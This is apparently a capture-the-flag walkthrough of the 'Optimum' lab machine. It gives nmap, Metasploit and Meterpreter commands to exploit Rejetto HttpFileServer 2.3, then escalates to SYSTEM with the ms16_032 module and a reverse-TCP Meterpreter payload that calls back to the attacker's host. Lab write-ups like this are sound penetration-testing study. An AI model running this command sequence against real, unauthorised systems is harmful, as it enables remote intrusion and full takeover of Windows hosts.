# Optimum - Walkthrough
![[Pasted image 20260105154154.png]]
# Enumeration
Starting out we know that this is going to be a Windows box with a known CVE module within Metasploit so we will go that route because why make it more difficult than it needs to be?
## nmap
``` bash
sudo nmap -Pn -A -T4 IP -oA initial.IP
```

![[Pasted image 20260105160503.png]]

From our scan we can see that we only have port 80 open on this machine that seems to just be a web server. The next logical step would be to navigate to the site just to see what we can find.

## Port 80 - HttpFileServer 2.3
![[Pasted image 20260105162154.png]]
Upon navigating to the server IP we discover this web page and after clicking around and seeing the application functionality I clicked into the HttpFileServer 2.3 link to discover the servers admin panel (rejetto.hfs)

![[Pasted image 20260105162552.png]]
# Exploitation
Remembering back to the description of the box I opened up a msfconsole session.

``` bash
msfconsole -q
```

Then performed a  search in metasploit to find the related CVE to the rejetto 2.3 server and found 2 viable options.

``` bash
search rejetto 2.3
```

![[Pasted image 20260105163935.png]]

After some trial and error of testing these 2, I decided to go with option 1.

``` bash
use 1
show options
set rhosts TargetIP
set lhosts tun0
run
```

![[Pasted image 20260105170121.png]]

After running the Metasploit exploit module I was able to establish a "meterpreeter" (GPEN inside joke) session and began to do some post compromise enumeration.
## Post-Compromise Enumeration
Once in I did some basic recon to find who we are and what the web app is running on.

``` bash
sysinfo
getuid
```

![[Pasted image 20260105165150.png]]

I found that the machine is Windows Server 2012 and we are the user OPTIMUM\kostas. The next thing I wanted to do real quick was check for the user.txt flag.

``` bash
ls
cat user.txt
```

![[Pasted image 20260105170514.png]]

Upon further enumeration, I noticed the initial Meterpreter session was running inside a 32-bit process (x86). To improve stability, I migrated into the user’s `explorer.exe` process (x64). By default, Metasploit often lands you in a 32-bit process context on 64-bit Windows, even when the Meterpreter payload itself is x64.

``` bash
getpid
ps
migrate PID
```

![[Pasted image 20260105172037.png]]

After awhile of finding nothing to useful to escalate I decided to background my session to use a metasploit module to find local privesc options for the session I had established using the post-exploitation module "post/multi/recon/local_exploit_suggester".

``` bash
sessions
set sessions SESSID
run
```

![[Pasted image 20260105174009.png]]

After a successful scan I found a couple of promising options. The one that stuck out the most was the ms16_032 because I'm wanting to achieve privesc.

``` bash
use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
options
set session SESSID
set lhost tun0
set target 1
set payload windows/x64/meterpreter/reverse_tcp
run
```

![[Pasted image 20260105180737.png]]

Sick the module worked as I had hoped! I ran a quick "getuid" to double check who I was and we were indeed SYSTEM. All that was left at this point was to navigate to the Admin Desktop space and grab the root.txt flag!

``` bash
shell
cd C:\Users\Administrator\Desktop
dir
type root.txt
```

![[Pasted image 20260105181414.png]]
Optimum completed. Happy Hacking! :)
